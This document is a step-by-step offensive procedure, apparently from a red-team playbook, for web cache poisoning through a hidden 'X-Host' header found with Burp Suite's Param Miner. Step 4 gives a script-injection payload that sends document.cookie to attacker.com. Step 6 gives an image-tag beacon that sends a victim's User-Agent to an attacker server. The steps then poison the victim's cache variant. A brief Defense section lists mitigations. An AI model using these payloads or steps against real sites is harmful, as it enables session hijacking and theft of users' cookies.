---
id: 515625a2-4285-4906-9272-9a48bd2ff44e
name: web-cache-poisoning-via-unknown-header-param-miner
type: procedure
verified: true
submitted: true
created_at: '2020-08-20T02:49:23.019761+00:00'
updated_at: '2023-05-26T18:39:20.246310+00:00'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - web-cache-poisoning
  - burp-suite
  - param-miner
  - web-applications
commands: []
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/Param-Miner]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Web Cache Poisoning via Unknown Header (Param Miner)

## Summary

This procedure uses the Param Miner Burp Suite extension to discover hidden headers in web applications, enabling web cache poisoning attacks. By identifying unhandled headers like 'x-host', attackers can inject malicious payloads that poison the cache, leading to reflected JavaScript execution (such as cookie theft) for all users hitting the poisoned cache.

## Description

Web cache poisoning exploits misconfigurations in caching mechanisms where servers cache responses based on incomplete or manipulated headers. This procedure focuses on discovering unknown headers using Param Miner, then crafting requests to inject dynamic content (e.g., JavaScript via a reflected header) into cached responses. The attack targets applications using content delivery networks (CDNs) or reverse proxies that forward unvalidated headers into response content, such as script tags. Once poisoned, the cache serves malicious content to victims, potentially stealing session cookies or other sensitive data. This is particularly effective against applications with dynamic resource loading based on headers.

## Requirements

1. Access to Burp Suite Professional with the Param Miner extension installed and enabled.
2. Network access to the target web application, including the ability to intercept and replay HTTP requests.
3. An attacker-controlled server to host exploit payloads and log victim data (e.g., user-agent or cookies).
4. Basic knowledge of HTTP headers, caching mechanisms (e.g., Vary header), and JavaScript for payload crafting.
5. Target application must use caching with header-based keys and reflect headers into response content.

## Defense

Defensive measures and detection strategies:

- Implement strict header validation and stripping of unknown headers before caching or rendering.
- Use comprehensive Vary headers to include all influencing factors in cache keys.
- Monitor for anomalous cache hits (x-cache: HIT) with unexpected response content.
- Enable web application firewall (WAF) rules to detect header manipulation and injection attempts.
- Log and analyze requests for repeated header testing patterns indicative of parameter discovery tools.

## Objectives

1. Identify hidden headers vulnerable to cache poisoning.
2. Poison the cache with a malicious JavaScript payload to exfiltrate victim cookies.
3. Confirm poisoning by observing cache hits and victim interaction logs.
4. Achieve unauthorized access to session data from cached responses.

## Instructions

### Step 1: Capture and Send Target Request to Repeater

**Context**: Browse the target application to populate Burp's HTTP history, then isolate the homepage GET request for manipulation. This establishes a baseline request for header guessing.

Using [[tools/Burp-Suite]]:
- Ensure intercept is off and proxy is running.
- Navigate to the target homepage to log the GET request in the HTTP history tab.
- Right-click the request and select "Send to Repeater".

> This step captures a clean request without modifications, allowing subsequent header insertion.

### Step 2: Guess Hidden Headers with Param Miner

**Context**: Use Param Miner to brute-force and identify unhandled headers, such as 'x-host', which may be reflected in responses. Add a cache buster to prevent interference from existing cache entries.

Using [[tools/Param-Miner]] within [[tools/Burp-Suite]] Repeater:
- Right-click the request in Repeater and select "Guess headers" (requires Param Miner enabled).
- Once identified (e.g., 'x-host'), manually add it to the request headers.
- Append a cache buster query parameter to the GET URL, e.g., ?cb=$(date +%s).

> Param Miner sends variations to detect headers that alter responses, indicating potential reflection points.

### Step 3: Verify Header Reflection

**Context**: Test the discovered header to confirm it influences dynamic content, such as generating script URLs based on the header value.

Using [[tools/Burp-Suite]] Repeater:
- Send the modified request with the new header (e.g., X-Host: test).
- Inspect the response for reflection, e.g., <script src="http://test.example.com/script.js">.

> Success is indicated by the header value appearing in the response body, confirming a poisoning vector.

### Step 4: Craft Cookie Theft Payload

**Context**: Create a JavaScript payload using [[codes/document-cookie-exfiltration-payload]] to steal cookies when reflected in a script tag.

Embed the payload in the header:
- Set X-Host to a value that injects the script, e.g., "><script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>.
- Send the request and verify reflection in the response.

> The payload executes in the victim's browser if cached, sending cookies to the attacker's server.

### Step 5: Poison the Cache

**Context**: Repeatedly send the payload request until a cache hit is observed, confirming the poisoned response is stored.

Using [[tools/Burp-Suite]] Repeater:
- Send the payload request multiple times.
- Check response headers for X-Cache: HIT.
- Note the Vary header (e.g., Vary: User-Agent) to identify cache key factors.

> Caching the poisoned response requires matching the exact cache key, including user-agent.

### Step 6: Determine Victim User-Agent

**Context**: Use [[codes/user-agent-logging-payload]] to capture the victim's User-Agent via a comment or image tag that beacons to the attacker server.

Inject into the application:
- Post a comment like: <img src="https://attacker-server.com/log?ua=" onerror="this.src+=' '+navigator.userAgent" />.
- Access your server logs to retrieve the User-Agent string.

> This step ensures the poisoning targets the victim's specific cache variant.

### Step 7: Finalize Poisoning for Victim

**Context**: Replay the payload with the victim's User-Agent to poison their cache variant, then have the victim access the page.

Using [[tools/Burp-Suite]] Repeater:
- Set the User-Agent header to the victim's value.
- Remove the cache buster from the URL.
- Send repeatedly until X-Cache: HIT.
- Direct the victim to the homepage to trigger the poisoned response.

> Victim access loads the injected JavaScript, exfiltrating their cookies.

## Expected Output

- Discovery of reflected headers like X-Host in responses.
- Cache hit (X-Cache: HIT) with payload-reflected content.
- Attacker server logs showing stolen cookies or User-Agent data.
- No errors in request/response cycles during poisoning.

## Success Indicators

- Hidden header identified and reflected in dynamic content.
- Poisoned cache confirmed via repeated HIT responses.
- Victim data (cookies/User-Agent) received on attacker server.
